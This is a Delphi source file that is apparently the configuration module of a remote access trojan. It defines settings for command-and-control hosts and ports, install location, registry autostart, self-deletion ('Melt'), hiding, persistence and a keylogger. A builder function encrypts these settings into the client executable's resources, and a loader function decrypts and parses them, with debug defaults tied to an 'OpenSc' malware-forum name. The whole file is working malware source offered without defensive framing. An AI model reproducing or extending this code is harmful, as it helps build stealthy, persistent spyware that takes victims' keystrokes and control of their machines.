unit UnitConfiguration; //by wrh1d3, fastiduous way but work for sure!
                       
//{$DEFINE DEBUGMODE} //comment the line to set debug mode off

interface

uses
  Windows, SysUtils, UnitUtils, UnitEncryption;

type
  TConfiguration = record //configuration settings
    ClientId, DNSList, PortsList, EncryptionKey,
    Destination, Foldername, Filename, RegValue, Mutex: string;
    Install, Startup, Melt, Hide, Persistence,
    CreationTime, HKCU, HKLM, Keylogger: Boolean;
    Delay: Integer;
  end;

function LoadConfiguration(ResourceName: string; var Config: TConfiguration): Boolean; //load configuration from resource (by client)
function SaveConfiguration(Filename, ResourceName: string; Config: TConfiguration): Boolean;  //save configuration to resource (by builder)

var
  Configuration: TConfiguration;

implementation

function SaveConfiguration(Filename, ResourceName: string; Config: TConfiguration): Boolean;
var
  Buffer: string;
begin
  //retrieve configuration datas for encryption
  Buffer := Config.ClientId + '$' + Config.DNSList + '$' + Config.PortsList + '$' +
    Config.EncryptionKey + '$' + Config.Destination + '$' + Config.Foldername + '$' +
    Config.Filename + '$' + Config.RegValue + '$' + Config.Mutex + '$' +
    IntToStr(Config.Delay) + '$' + BoolToStr(Config.Install) + '$' +
    BoolToStr(Config.Startup) + '$' + BoolToStr(Config.Melt) + '$' +
    BoolToStr(Config.Hide) + '$' + BoolToStr(Config.Persistence) + '$' +
    BoolToStr(Config.CreationTime) + '$' + BoolToStr(Config.HKCU) + '$' +
    BoolToStr(Config.HKLM) + '$' + BoolToStr(Config.Keylogger) + '$';

  //encrypt buffer
  Buffer := EncryptString(Buffer, MainPassword);
  Result := WriteResData(Filename, @Buffer[1], Length(Buffer), ResourceName); //write ressource
end;

function LoadConfiguration(ResourceName: string; var Config: TConfiguration): Boolean;
var
  Buffer: string;
  TmpList: TStringArray;
begin
  {$IFNDEF DEBUGMODE} //read configuration from file only if debug mode is off
  Buffer := GetResourceAsString(PChar(ResourceName)); //get resource
  Result := Buffer <> '';
  if Buffer = '' then Exit;

  //decrypt configuration
  Buffer :=  DecryptString(Buffer, MainPassword);
  TmpList := ParseString('$', Buffer); //parse items

  //set configuration settings
  Config.ClientId := TmpList[0];
  Config.DNSList := TmpList[1];
  Config.PortsList := TmpList[2];
  Config.EncryptionKey := TmpList[3];
  Config.Destination := TmpList[4];
  Config.Foldername := TmpList[5];
  Config.Filename := TmpList[6];
  Config.RegValue := TmpList[7];
  Config.Mutex := TmpList[8];
  Config.Delay := StrToInt(TmpList[9]);
  Config.Install := StrToBool(TmpList[10]);
  Config.Startup := StrToBool(TmpList[11]);
  Config.Melt := StrToBool(TmpList[12]);
  Config.Hide := StrToBool(TmpList[13]);
  Config.Persistence := StrToBool(TmpList[14]);
  Config.CreationTime := StrToBool(TmpList[15]);
  Config.HKCU := StrToBool(TmpList[16]);
  Config.HKLM := StrToBool(TmpList[17]);
  Config.Keylogger := StrToBool(TmpList[18]);
  {$ELSE} //set configuration manually if debug mode is on
  Config.ClientId := 'debug';
  Config.DNSList := '127.0.0.1|';
  Config.PortsList := '1992|';
  Config.EncryptionKey := 'opensc.ws';
  Config.Destination := '%APPDATA%';
  Config.Foldername := 'OpenSc';
  Config.Filename := 'OpenSc.exe';
  Config.RegValue := 'OpenSc';
  Config.Mutex := '';
  Config.Delay := 1;
  Config.Install := False;
  Config.Startup := False;
  Config.Melt := False;
  Config.Hide := False;
  Config.Persistence := False;
  Config.CreationTime := False;
  Config.HKCU := False;
  Config.HKLM := False;
  Config.Keylogger := False;

  Result := True; //always
  {$ENDIF}
end;

end.
